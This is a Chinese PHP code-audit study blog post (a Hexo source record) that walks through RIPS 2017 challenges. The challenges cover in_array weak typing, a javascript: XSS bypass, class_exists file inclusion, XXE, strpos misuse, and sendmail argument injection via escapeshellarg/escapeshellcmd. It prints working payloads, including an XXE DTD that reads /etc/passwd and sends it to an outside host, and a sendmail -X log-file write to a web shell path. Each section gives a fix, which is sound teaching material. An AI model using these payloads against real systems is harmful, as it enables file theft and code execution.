说完`mail()`函数继续来分析源码，源码中第17行`$data['from']`为用户可控，并且传入到了第31行`mail()`函数中的第5参数中。虽然使用了`sanitize`函数进行过滤，`sanitize`函数首先调用了`FILTER_VALIDATE_EMAIL`过滤器验证传入值是否为有效的电子邮件地址，然后使用了`escapeshellarg`函数对返回值进行了转码过滤。\n\n首先讨论一下`FILTER_VALIDATE_EMAIL`这个过滤器，这个过滤器仅仅是以RFC822规则验证邮箱地址是否有效正确，但是并不会验证其安全性。附各PHP版本下绕过`FILTER_VALIDATE_EMAIL`的运行情况。可以看到在>=5.2.0版本`fliter_var()`函数才被添加，其中某些版本会返回**false**，所以测试中需要注意版本。\n\n![FILTER_VALIDATE_EMAIL](php-code-review/FILTER_VALIDATE_EMAIL.jpg)\n\n然后我们绕过`FILTER_VALIDATE_EMAIL`的情况下还需要绕过`escapeshellarg（）`和`escapeshellcmd（）`，先看一下PHP文档对这两个函数的描述。\n\n> **escapeshellarg**\n> \n> (PHP 4 >= 4.0.3, PHP 5, PHP 7)\n> \n> escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数\n> \n> **说明** \n> \n> string escapeshellarg ( string $arg )\n> \n> escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。\n\n\n> **escapeshellcmd**\n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> escapeshellcmd — shell 元字符转义\n> \n> **说明**\n> \n> string escapeshellcmd ( string $command )\n> \n> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。\n> \n> 反斜线（\\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\\, \\x0A 和 \\xFF。 ' 和 \" 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。\n\n\n可以看到`escapeshellarg（）`和底层的`escapeshellcmd（）`是用来保护系安全，防止代码注入的转义函数。但是`escapeshellarg（）`和`escapeshellcmd（）`一起使用的话并不安全。\n\n```php\n<?php\n$a=escapeshellarg(\"172.17.0.2' -v -d a=1\");\n$b=escapeshellcmd(\"172.17.0.2' -v -d a=1\");\n$c=escapeshellcmd(escapeshellarg(\"172.17.0.2' -v -d a=1\"));\nvar_dump($a).PHP_EOL;\nvar_dump($b).PHP_EOL;\nvar_dump($c).PHP_EOL;\n?>\n```\n\n如上我们使用`172.17.0.2' -v -d a=1`这样的payload来进行测试。\n测试结果如下\n![ESCAPE](php-code-review/escape.jpg)\n可以看到在第1、2、4种输出中，`escapeshellcmd(escapeshellarg(\"172.17.0.2' -v -d a=1\"))`的输出为`string(28) \"'172.17.0.2'\\\\'' -v -d a=1\\'\"`\n详细分析一下：\n\n1. 传入的参数是：`172.17.0.2' -v -d a=1`。\n2. 经过escapeshellarg处理后变成了`'172.17.0.2'\\'' -v -d `a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。\n3. 经过escapeshellcmd处理后变成`'172.17.0.2'\\\\'' -v -d a=1\\'`，这是因为escapeshellcmd对`\\`以及最后那个没有配对的`'`进行了转义，而忽略对之前两对匹配了的`'`进行转意。\n4. 最后执行的命令是`'curl 172.17.0.2'\\\\'' -v -d a=1\\'`，由于中间的`\\\\`被解释为`\\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。所以可以简化为`curl 172.17.0.2\\ -v -d a=1'`，即向`172.17.0.2\\`发起请求，**POST** 数据为`a=1'`。\n\n此处分析学习自[https://paper.seebug.org/164/](https://paper.seebug.org/164/ \"PHP escapeshellarg()+escapeshellcmd() 之殇\")\n\n### 利用 ###\n\n最终传入`mail()`函数的第5参数的payload大概为`a\"'(\\ -OQueueDirectory=/tmp\\ -X/var/www/html/test.php\\ )\"@a.com`,在执行时变成了`'-fa\"'\\\\''\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)\"@a.com\\'`，如上面的分析`-f`为MTA预设参数，`'-fa\"\\\\'''\\(`为第一部分，转义后运行时相当于`-fa\"\\(`,这部分作用就是将`-f`参数闭合造成后续payload逃逸形成注入；`-OQueueDirectory=/tmp`为第二部分可操作恶意内容，`-X/var/www/html/test.php`为第三部分可操作恶意内容，`\\)\"@a.com\\'`为绕过`FILTER_VALIDATE_EMAIL`过滤的必须部分。这样结合起来就完成了注入，但是由于邮箱格式要求以及转义过多，真实进行测试时会带有很多`\"``\\``'`符号，还需要多多调整来进行测试。\n\n### 修复 ###\n**PHPmailer**官方的修复方案是，对用户传参的输入进行检测，如果有转义字符就不传递第5参数，也不会造成注入。\n所以总结一下核心问题还是`escapeshellarg()`→`escapeshellcmd()`这一过程会出现重复转义造成的漏洞。\n\n\n----------\n\n##  ##","source":"_posts/php-code-review.md","raw":"---\nlayout: ““\ntitle: php code review\ndate: 2018-08-06 17:28:57\ntags:\n---\n# PHP代码审计学习 #\n\n----------\n\n项目来源：https://www.ripstech.com/php-security-calendar-2017/\n\n## in_array()函数误用 ##\n\n### 分析 ###\n\n```php\nclass Challenge {\n    const UPLOAD_DIRECTORY = './solutions/';\n    private $file;\n    private $whitelist;\n\n    public function __construct($file) {\n        $this->file = $file;\n        $this->whitelist = range(1, 24);\n    }\n\n    public function __destruct() {\n        if (in_array($this->file['name'], $this->whitelist)) {\n            move_uploaded_file(\n                $this->file['tmp_name'],\n                self::UPLOAD_DIRECTORY . $this->file['name']\n            );\n        }\n    }\n}\n\n$challenge = new Challenge($_FILES['solution']);\n```\n\n出现问题的源代码如上，使用`in_array()`函数检查匹配`file['name']`是否在`whitelist`中，但忽略了`in_array()`函数中未设置强匹配参数，导致了弱类型问题。\n\nphpmanual中对in_array的参数解释如下\n\n```\nbool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )\n\n//大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。\n\n//strict\n如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。\n```\n\n### 利用 ###\n\n其实就是php弱类型的利用，程序员编写时由于不严谨认为输入一定会是int整型数据，我们输入str字符型数据然后利用php的弱类型特点即可。\n\n弱类型的规律举例如下\n```\n<?php\n\n$array = array(\n    'egg' => true,\n    'cheese' => false,\n    'hair' => 765,\n    'goblins' => null,\n    'ogres' => 'no ogres allowed in this array'\n);\n\n// Loose checking -- return values are in comments\n\n// First three make sense, last four do not\n\nvar_dump(in_array(null, $array)); // true\nvar_dump(in_array(false, $array)); // true\nvar_dump(in_array(765, $array)); // true\nvar_dump(in_array(763, $array)); // true\nvar_dump(in_array('egg', $array)); // true\nvar_dump(in_array('hhh', $array)); // true\nvar_dump(in_array(array(), $array)); // true\n\n// Strict checking\nvar_dump(in_array(null, $array, true)); // true\nvar_dump(in_array(false, $array, true)); // true\nvar_dump(in_array(765, $array, true)); // true\nvar_dump(in_array(763, $array, true)); // false\nvar_dump(in_array('egg', $array, true)); // false\nvar_dump(in_array('hhh', $array, true)); // false\nvar_dump(in_array(array(), $array, true)); // false\n\n?>\n```\n\n### 修复 ###\n\n使用`===`强匹配或`in_array()`函数加上第三个参数`$strict=ture`\n\n----------\n\n## 一个XSS过滤绕过trick ##\n\n### 分析 ###\n```php\n// composer require \"twig/twig\"\nrequire 'vendor/autoload.php';\n\nclass Template {\n    private $twig;\n\n    public function __construct() {\n        $indexTemplate = '<img ' .\n            'src=\"https://loremflickr.com/320/240\">' .\n            '<a href=\"{{link|escape}}\">Next slide »</a>';\n\n        // Default twig setup, simulate loading\n        // index.html file from disk\n        $loader = new Twig\\Loader\\ArrayLoader([\n            'index.html' => $indexTemplate\n        ]);\n        $this->twig = new Twig\\Environment($loader);\n    }\n\n    public function getNexSlideUrl() {\n        $nextSlide = $_GET['nextSlide'];\n        return filter_var($nextSlide, FILTER_VALIDATE_URL);\n    }\n\n    public function render() {\n        echo $this->twig->render(\n            'index.html',\n            ['link' => $this->getNexSlideUrl()]\n        );\n    }\n}\n\n(new Template())->render();\n```\n以php的一个模版引擎twig为例，对url进行XSS安全过滤，其中`escape`和`FILTER_VALIDATE_URL`进行了两次过滤转换。\n\n第一次在第10行，`escape`过滤，使用的是php自带的`htmlspecialchars`函数\n\n\n> htmlspecialchars\n> (PHP 4, PHP 5, PHP 7)\n> htmlspecialchars — 将特殊字符转换为 HTML 实体\n> \n> ```& (& 符号)  ===============  &amp;\n\" (双引号)  ===============  &quot;\n' (单引号)  ===============  &apos;\n< (小于号)  ===============  &lt;\n> (大于号)  ===============  &gt;```\n\n第二次过滤在22行，使用filter_var函数用`FILTER_VALIDATE_URL`过滤器对`$nextSlide`变量进行过滤。检查是否是合法的url。\n\n### 利用 ###\n可以看到代码对XSS常用的\"'<>符号进行了过滤，但我们可以利用`%0a`换行符的trick来逃逸过滤，可以通过以下payload执行，首先引入`javascript:`协议，然后利用javascript中`//`代表单行注释，而`%250a`经过一次urldecode变成`%0a`换行符，成功逃逸出注释行，从而进入`echo`函数中形成XSS。\n` ?nextSlide=javascript://comment%250aalert(1)`\n\n**稍微总结一下常规bypass思路，试敏感关键函数和敏感符号→试编码或注释符号等混淆方法→试伪协议。**\n\n### 修复 ###\n针对XSS敏感关键词进行黑名单过滤\n\n----------\n\n## class_exists函数和实例化可控导致的XXE漏洞 ##\n### 分析 ###\n代码如下\n```php\nfunction __autoload($className) {\n    include $className;\n}\n\n$controllerName = $_GET['c'];\n$data = $_GET['d'];\n\nif (class_exists($controllerName)) {\n    $controller = new $controllerName($data['t'], $data['v']);\n    $controller->render();\n} else {\n    echo 'There is no page with this name';\n}\n\nclass HomeController {\n    private $template;\n    private $variables;\n\n    public function __construct($template, $variables) {\n        $this->template = $template;\n        $this->variables = $variables;\n    }\n\n    public function render() {\n        if ($this->variables['new']) {\n            echo 'controller rendering new response';\n        } else {\n            echo 'controller rendering old response';\n        }\n    }\n}\n```\n这段代码中有两个安全漏洞。第8行中调用class_exists（）会触发文件包含漏洞。\nPHP文档中对于`class_exist`函数的解释如下\n>**class_exists** \n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> class_exists — 检查类是否已定义\n> \n> 说明 \n> \n> bool class_exists ( string $class_name [, bool $autoload = true ] )检查指定的类是否已定义。\n> \n> 参数 \n> \n> class_name\n> \n> 类名。名字的匹配是不分区大小写的。\n> \n> autoload\n> \n> 是否默认调用 __autoload。\n\n\n可知`class_exist`函数默认调用`__autoload`函数，其中调用了`include`函数，会造成文件包含漏洞。可以使用路径穿越来包含任意文件，但是使用像这样的`../../../../etc/passwd`路径穿越符号的前提是PHP版本在5~5.3(包含5.3)版本之间才可以。\n但是第二个漏洞仍然适用于当前的PHP版本。在以下几行:\n```php\n$controllerName = $_GET['c']; //这里$controllerName可控\n$data = $_GET['d'];           //这里$data可控  \n\nif (class_exists($controllerName)) {\n    $controller = new $controllerName($data['t'], $data['v']);\n//这里使用可控的变量实例化了一个对象，而对象的名称及内容均可控。\n```\n这样的话，恶意的payload便可以控制实例化过程，任意构造函数，即使代码库本身没有易受攻击的函数。也可以使用PHP内置的SimpleXMLElement函数来进行XXE攻击，进行文件读取操作等行为。\n### 利用 ###\n 1.文件包含漏洞\n 令`class_exist`函数传入形如`../../../../etc/passwd`的payload即可；\n\n 2.实例化SimpleXMLElement进行XXE攻击，查看php手册，SimpleXMLElement构造函数说明如下：\n> **SimpleXMLElement::__construct**\n> \n> (PHP 5, PHP 7)\n> \n> SimpleXMLElement::__construct — Creates a new SimpleXMLElement object\n> \n> **说明** \n> final public SimpleXMLElement::__construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = \"\" [, bool $is_prefix = FALSE ]]]] )\n> \n> 创建一个新的SimpleXMLElement对象。\n> \n> 参数 \n> \n> data\n> \n> 格式良好的XML字符串或XML文档的路径或URL（如果 data_is_url是）TRUE。\n> \n> options\n可选地用于指定其他Libxml参数。\n> \n> 注意：\n> 可能需要传递LIBXML_PARSEHUGE 以能够处理深度嵌套的XML或非常大的文本节点。\n> \n> data_is_url\n> \n> 默认情况下data_is_url是FALSE。使用TRUE指定data的路径或URL到一个XML文件，而不是字符串数据。\n> \n> ns\n> 命名空间前缀或URI。\n> is_prefix\n> TRUE如果ns是前缀，FALSE如果是URI; 默认为FALSE。\n\n 所以构造形如`{\"SimpleXMLElement\":{\"data\":\"http://localhost/xxe.xml\",\"options\":2,\"data_is_url\":1,\"ns\":\"\",\"is_prefix\":0}}`其中SimpleXMLElement为实例化函数名，后续payload为SimpleXMLElement构造函数的内容，xxe.xml为XML实体文件。XML实体文件写法可以参考[XXE漏洞分析 from 404 Not Found](http://www.4o4notfound.org/index.php/archives/29/#pingback-28)这里就不多做探讨。\n\n 举一个例子:\n```xxe.xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://1.3.3.7:8000/xxe.dtd\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n```\n\n```xml.dtd\n<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">      //这里使用base64编码是起读取文件时不丢失一些特殊符号的作用\n<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://1.3.3.7:8000/?%data;'>\">\n```\n\n### 修复 ###\n 1.将`class_exist`函数中的`bool $autoload`参数设为false，即不自动调用`__autoload`函数；或者`__autoload函数`中不要使用`include`函数；或升级PHP版本避免路径遍历符号的传递。\n \n 2.PHP中防御XXE攻击方法：设置`libxml_disable_entity_loader(true);`；当然最大的问题还是不应该让实例化对象变成用户输入可控。\n\n----------\n\n## strpo()函数误用 ##\n源码如下：\n```php\nclass Login {\n    public function __construct($user, $pass) {\n        $this->loginViaXml($user, $pass);\n    }\n\n    public function loginViaXml($user, $pass) {\n        if (\n            (!strpos($user, '<') || !strpos($user, '>')) &&\n            (!strpos($pass, '<') || !strpos($pass, '>'))\n        ) {\n            $format = '<?xml version=\"1.0\"?>' .\n                      '<user v=\"%s\"/><pass v=\"%s\"/>';\n            $xml = sprintf($format, $user, $pass);\n            $xmlElement = new SimpleXMLElement($xml);\n            // Perform the actual login.\n            $this->login($xmlElement);\n        }\n    }\n}\n\nnew Login($_POST['username'], $_POST['password']);\n```\n### 分析 ###\n可以看到此段代码的第8，9行使用`strpo()`函数检查payload中是否有`<``>`符号，以检查XML利用的敏感符号。检查后传入第11、12行的`$format`变量中，然后格式化生成XML。\n`strpos()`函数文档如下：\n> **strpos**\n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> strpos — 查找字符串首次出现的位置\n> \n> **说明** \n> int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )\n> 返回 needle 在 haystack 中首次出现的数字位置。\n> \n> **参数**\n> haystack\n> 在该字符串中进行查找。\n> \n> needle\n> 如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。\n> \n> offset\n> 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。\n> \n> **返回值** \n> 返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。\n> \n> 如果没找到 needle，将返回 FALSE。\n> \n> **Warning**\n> 此函数可能返回布尔值 FALSE，但也可能返回等同于 FALSE 的非布尔值。请阅读 布尔类型章节以获取更多信息。应使用 === 运算符来测试此函数的返回值。\n \n这里**Warning**中已经提示了`strpos()`可能返回等同于FALSE的非布尔值，即在首位查询到了条件并返回了值为`0`，又因为PHP的弱类型特性，若没有使用`===`的强匹配，`0`就会等于`false`。\n\n### 利用 ###\n 前文已分析到令查询位置为首位即可，故payload可以为`user=<\"><injected-tag%20property=\"&pass=<injected-tag>`\n \n 其中首位的`<`可以令`strpo()`函数返回`0`即`FALSE`，从而绕过检查，`\">`是为了闭合之前的内容，然后就可以利用XML进行各种XXE攻击的利用\n\n### 修复 ###\n使用`===`强匹配\n\n----------\n\n## mali()函数的危险性 ##\n\n源代码：\n```php\nclass Mailer {\n    private function sanitize($email) {\n        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {\n            return '';\n        }\n\n        return escapeshellarg($email);\n    }\n\n    public function send($data) {\n        if (!isset($data['to'])) {\n            $data['to'] = 'none@ripstech.com';\n        } else {\n            $data['to'] = $this->sanitize($data['to']);\n        }\n\n        if (!isset($data['from'])) {\n            $data['from'] = 'none@ripstech.com';\n        } else {\n            $data['from'] = $this->sanitize($data['from']);\n        }\n\n        if (!isset($data['subject'])) {\n            $data['subject'] = 'No Subject';\n        }\n\n        if (!isset($data['message'])) {\n            $data['message'] = '';\n        }\n\n        mail($data['to'], $data['subject'], $data['message'],\n             '', \"-f\" . $data['from']);\n    }\n}\n\n$mailer = new Mailer();\n$mailer->send($_POST);\n```\n### 分析 ###\n此漏洞主要是由于`mail()`函数的第五个参数，先看一下`mail()`函数的用法：\n> **mail**\n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> mail — 发送邮件\n> \n> **说明**\n> \n> bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )\n> 发送一封电子邮件。\n> \n> **参数**\n> \n> **to**\n> 收件人\n> **subject**\n> 主题\n> **message**\n> 邮件内容\n> **additional_headers**\n> 添加邮件的额外头部，如`CC:`Carbon Copy(抄送)、`BCC:`Blind CarbonCopy(秘密抄送)\n> **additional_parameters**\n> 传递给发送程序sendmail的额外参数。例如，当使用带有-f sendmail选项的sendmail时，可以使用此选项设置邮件发件人地址 。\n\n在Linux系统上， php 的 mail 函数在底层中已经写好了，默认调用 Linux 的 **sendmail** 程序发送邮件。而在额外参数( additional_parameters )中， sendmail 主要支持的选项有以下三种：\n> -O option = value\n> \n> QueueDirectory = queuedir 选择队列消息\n> \n> -X logfile\n> \n> 这个参数可以指定一个目录来记录发送邮件时的详细日志情况。\n> \n> -f from email\n> \n> 这个参数可以让我们指定我们发送邮件的邮箱地址。\n\n 在PHP中使用`mail()`函数的话需要在`php.ini`中配置以下两个选项中的一种：\n 1.配置好SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议的服务器hostname和port来告诉PHP使用那个代理。\n 2.配置好一个邮件程序的文件地址，使其作为MTA(Mail Transfer Agent)即邮件传输代理。\n \n 当PHP是用第2种方式配置的时候，`mail()`将传递给MTA程序运行，虽然PHP默认提供了`escapeshellcmd()`这个函数在这些`&#;|*?~<>^()[]{}$\\, \\x0A 和 \\xFF`字符前插入`\\`进行转义以防止代码注入的安全性问题，但是`mail()`函数的第5个参数`$additional_parameters`允许用户添加新参数的特性使得可以被攻击者利用。\n```php\nmail(\"myfriend@example.com\", \"subject\", \"message\", \"\", \"-f\" . $_GET['from']); //程序代码举例\n\nexample@example.com -O QueueDirectory=/tmp -X /var/www/html/rce.php //payload举例 -O 可以用来重新配置sendmail选项 -X可以指定日志文件位置\n```\n\n 之前PHPMailer漏洞CVE-2016-10033就是这样发现的，影响到了包括像Wordpress这样广泛使用的程序。\n\n 说完`mail()`函数继续来分析源码，源码中第17行`$data['from']`为用户可控，并且传入到了第31行`mail()`函数中的第5参数中。虽然使用了`sanitize`函数进行过滤，`sanitize`函数首先调用了`FILTER_VALIDATE_EMAIL`过滤器验证传入值是否为有效的电子邮件地址，然后使用了`escapeshellarg`函数对返回值进行了转码过滤。\n\n首先讨论一下`FILTER_VALIDATE_EMAIL`这个过滤器，这个过滤器仅仅是以RFC822规则验证邮箱地址是否有效正确，但是并不会验证其安全性。附各PHP版本下绕过`FILTER_VALIDATE_EMAIL`的运行情况。可以看到在>=5.2.0版本`fliter_var()`函数才被添加，其中某些版本会返回**false**，所以测试中需要注意版本。\n\n![FILTER_VALIDATE_EMAIL](php-code-review/FILTER_VALIDATE_EMAIL.jpg)\n\n然后我们绕过`FILTER_VALIDATE_EMAIL`的情况下还需要绕过`escapeshellarg（）`和`escapeshellcmd（）`，先看一下PHP文档对这两个函数的描述。\n\n> **escapeshellarg**\n> \n> (PHP 4 >= 4.0.3, PHP 5, PHP 7)\n> \n> escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数\n> \n> **说明** \n> \n> string escapeshellarg ( string $arg )\n> \n> escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。\n\n\n> **escapeshellcmd**\n> \n> (PHP 4, PHP 5, PHP 7)\n> \n> escapeshellcmd — shell 元字符转义\n> \n> **说明**\n> \n> string escapeshellcmd ( string $command )\n> \n> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。\n> \n> 反斜线（\\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\\, \\x0A 和 \\xFF。 ' 和 \" 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。\n\n\n可以看到`escapeshellarg（）`和底层的`escapeshellcmd（）`是用来保护系安全，防止代码注入的转义函数。但是`escapeshellarg（）`和`escapeshellcmd（）`一起使用的话并不安全。\n\n```php\n<?php\n$a=escapeshellarg(\"172.17.0.2' -v -d a=1\");\n$b=escapeshellcmd(\"172.17.0.2' -v -d a=1\");\n$c=escapeshellcmd(escapeshellarg(\"172.17.0.2' -v -d a=1\"));\nvar_dump($a).PHP_EOL;\nvar_dump($b).PHP_EOL;\nvar_dump($c).PHP_EOL;\n?>\n```\n\n如上我们使用`172.17.0.2' -v -d a=1`这样的payload来进行测试。\n测试结果如下\n![ESCAPE](php-code-review/escape.jpg)\n可以看到在第1、2、4种输出中，`escapeshellcmd(escapeshellarg(\"172.17.0.2' -v -d a=1\"))`的输出为`string(28) \"'172.17.0.2'\\\\'' -v -d a=1\\'\"`\n详细分析一下：\n\n1. 传入的参数是：`172.17.0.2' -v -d a=1`。\n2. 经过escapeshellarg处理后变成了`'172.17.0.2'\\'' -v -d `a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。\n3. 经过escapeshellcmd处理后变成`'172.17.0.2'\\\\'' -v -d a=1\\'`，这是因为escapeshellcmd对`\\`以及最后那个没有配对的`'`进行了转义，而忽略对之前两对匹配了的`'`进行转意。\n4. 最后执行的命令是`'curl 172.17.0.2'\\\\'' -v -d a=1\\'`，由于中间的`\\\\`被解释为`\\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。所以可以简化为`curl 172.17.0.2\\ -v -d a=1'`，即向`172.17.0.2\\`发起请求，**POST** 数据为`a=1'`。\n\n此处分析学习自[https://paper.seebug.org/164/](https://paper.seebug.org/164/ \"PHP escapeshellarg()+escapeshellcmd() 之殇\")\n\n### 利用 ###\n\n最终传入`mail()`函数的第5参数的payload大概为`a\"'(\\ -OQueueDirectory=/tmp\\ -X/var/www/html/test.php\\ )\"@a.com`,在执行时变成了`'-fa\"'\\\\''\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)\"@a.com\\'`，如上面的分析`-f`为MTA预设参数，`'-fa\"\\\\'''\\(`为第一部分，转义后运行时相当于`-fa\"\\(`,这部分作用就是将`-f`参数闭合造成后续payload逃逸形成注入；`-OQueueDirectory=/tmp`为第二部分可操作恶意内容，`-X/var/www/html/test.php`为第三部分可操作恶意内容，`\\)\"@a.com\\'`为绕过`FILTER_VALIDATE_EMAIL`过滤的必须部分。这样结合起来就完成了注入，但是由于邮箱格式要求以及转义过多，真实进行测试时会带有很多`\"``\\``'`符号，还需要多多调整来进行测试。\n\n### 修复 ###\n**PHPmailer**官方的修复方案是，对用户传参的输入进行检测，如果有转义字符就不传递第5参数，也不会造成注入。\n所以总结一下核心问题还是`escapeshellarg()`→`escapeshellcmd()`这一过程会出现重复转义造成的漏洞。\n\n\n----------\n\n##  ##","slug":"php-code-review","published":1,"updated":"2018-08-10T19:52:58.000Z","comments":1,"photos":[],"link":"","_id":"cjrod1l7v0008143agvx429bk","content":"<h1 id=\"PHP代码审计学习\"><a href=\"#PHP代码审计学习\" class=\"headerlink\" title=\"PHP代码审计学习\"></a>PHP代码审计学习</h1><hr>\n<p>项目来源：<a href=\"https://www.ripstech.com/php-security-calendar-2017/\" target=\"_blank\" rel=\"noopener\">https://www.ripstech.com/php-security-calendar-2017/</a></p>\n<h2 id=\"in-array-函数误用\"><a href=\"#in-array-函数误用\" class=\"headerlink\" title=\"in_array()函数误用\"></a>in_array()函数误用</h2><h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Challenge</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> UPLOAD_DIRECTORY = <span class=\"string\">'./solutions/'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $file;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $whitelist;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($file)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file = $file;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;whitelist = range(<span class=\"number\">1</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (in_array(<span class=\"keyword\">$this</span>-&gt;file[<span class=\"string\">'name'</span>], <span class=\"keyword\">$this</span>-&gt;whitelist)) &#123;</span><br><span class=\"line\">            move_uploaded_file(</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;file[<span class=\"string\">'tmp_name'</span>],</span><br><span class=\"line\">                <span class=\"keyword\">self</span>::UPLOAD_DIRECTORY . <span class=\"keyword\">$this</span>-&gt;file[<span class=\"string\">'name'</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$challenge = <span class=\"keyword\">new</span> Challenge($_FILES[<span class=\"string\">'solution'</span>]);</span><br></pre></td></tr></table></figure>\n<p>出现问题的源代码如上，使用<code>in_array()</code>函数检查匹配<code>file[&#39;name&#39;]</code>是否在<code>whitelist</code>中，但忽略了<code>in_array()</code>函数中未设置强匹配参数，导致了弱类型问题。</p>\n<p>phpmanual中对in_array的参数解释如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</span><br><span class=\"line\"></span><br><span class=\"line\">//大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class=\"line\"></span><br><span class=\"line\">//strict</span><br><span class=\"line\">如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>其实就是php弱类型的利用，程序员编写时由于不严谨认为输入一定会是int整型数据，我们输入str字符型数据然后利用php的弱类型特点即可。</p>\n<p>弱类型的规律举例如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$array = array(</span><br><span class=\"line\">    &apos;egg&apos; 